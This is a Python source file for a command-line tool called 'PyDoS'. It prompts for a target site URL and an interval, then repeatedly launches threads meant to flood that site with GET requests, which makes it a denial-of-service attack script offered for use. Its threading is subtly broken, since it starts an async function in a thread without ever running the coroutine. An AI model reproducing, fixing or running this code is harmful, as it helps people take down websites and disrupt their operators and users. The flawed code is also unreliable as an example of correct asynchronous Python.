from asyncio import run
from datetime import datetime
from enum import Enum
from os import system
from os.path import exists
from threading import Thread
from time import sleep
from typing import Final

from aiohttp import ClientSession, ClientConnectionError, InvalidURL


class Color(Enum):
    """
    An enumeration of color codes for formatting text output.

    Attributes:
    - PURPLE: The color code for purple.
    - GREEN: The color code for green.
    - CYAN: The color code for cyan.
    - RED: The color code for red.
    - YELLOW: The color code for yellow.
    - STOP: The color code to reset the text color.
    """
    PURPLE: str = '\033[35m'
    GREEN: str = '\033[32m'
    CYAN: str = '\033[96m'
    RED: str = '\033[31m'
    YELLOW: str = '\033[33m'
    STOP: str = '\033[0m'


# CONSTANTS
logo: Final[str] = """
██████╗░██╗░░░██╗██████╗░░█████╗░░██████╗
██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗██╔════╝
██████╔╝░╚████╔╝░██║░░██║██║░░██║╚█████╗░
██╔═══╝░░░╚██╔╝░░██║░░██║██║░░██║░╚═══██╗
██║░░░░░░░░██║░░░██████╔╝╚█████╔╝██████╔╝
╚═╝░░░░░░░░╚═╝░░░╚═════╝░░╚════╝░╚═════╝░
"""

commands: Final[str] = '''
Usage:
    --DoS:  Denial-of-Service 
    --help:  print this menu
    --settings:  open settings menu
'''

settings: Final[str] = '''
Usage:
    def_time: sets default time sleep
    exit: exit from the settings menu
'''

system("")  # init colors

current_date = datetime.now().date()
current_datetime = datetime.now()

print(f"{Color.PURPLE}{logo}")

print(commands)

site: str


async def dos() -> None:
    """
    Executes a continuous loop that tries to make a GET request to a given site.
    """
    global site
    async with ClientSession() as session:
        while True:
            try:
                await session.get(site)
            except ClientConnectionError:
                print(f"{Color.RED}PRESS Ctrl+V to out Request Error, object closed or your IP blocked, trying to connect...")
                print(Color.STOP)


async def main() -> None:
    global site
    while True:
        match input(f"{Color.PURPLE}Enter command: >>> "):
            case '--DoS':
                async with ClientSession() as session:
                    try:
                        await session.get("https://www.google.com/")
                        print(f"{Color.GREEN}Internet Connection is OK!")
                    except ClientConnectionError:
                        print(f"{Color.RED}[!]{Color.YELLOW}Connection Error!")
                        continue

                    while True:
                        site = input(f"{Color.PURPLE}Enter site URL: >>>")
                        try:
                            await session.get(site)
                            print(f"{Color.GREEN}Connection to {site} is OK!")
                            break
                        except InvalidURL:
                            print(f"{Color.RED}[!]{Color.YELLOW} Invalid URL!")

                print(Color.PURPLE)
                while True:
                    try:
                        if exists("components/settings/deftime.txt"):
                            with open("components/settings/deftime.txt") as f:
                                sleep_time: str | float = f.read()
                            if input(f"{Color.PURPLE}Do you want to use set time sleep? (n/y): >>>") == "y":
                                sleep_time = float(sleep_time)
                                print(f"{Color.PURPLE}Set time: {sleep_time}")
                                break

                        sleep_time = float(input(f"{Color.PURPLE}Enter time sleep: >>>"))
                        break
                    except ValueError:
                        print(f"{Color.RED}[!]{Color.YELLOW} Please, enter floatable number!")

                print(Color.STOP)
                print(f"{Color.GREEN}DoS successfully started to {site}")
                print(Color.STOP)
                while True:
                    sleep(sleep_time)
                    Thread(target=dos).start()

            case '--help':
                print(commands)

            case '--settings':
                print("This is a settings")
                print(settings)
                while True:
                    match input(f"{Color.PURPLE}Enter setting: >>>"):
                        case "def_time":
                            try:
                                sleep_time = input(f"{Color.PURPLE}Enter default time sleep: >>>")
                                if sleep_time.startswith("ex"):
                                    continue
                                with open("components/settings/deftime.txt", "w") as f:
                                    f.write(sleep_time)
                                print(f"{Color.GREEN}[!] Successfully wrote default time sleep ({sleep_time})")
                            except Exception as e:
                                print(f"{Color.RED}[!]{Color.YELLOW} Error: {e}")
                                continue

                        case "exit":
                            print("Exiting from settings!")
                            break

            case _:
                print(f"{Color.RED}[!]{Color.YELLOW} Error: undefined command!")

if __name__ == "__main__":
    run(main())
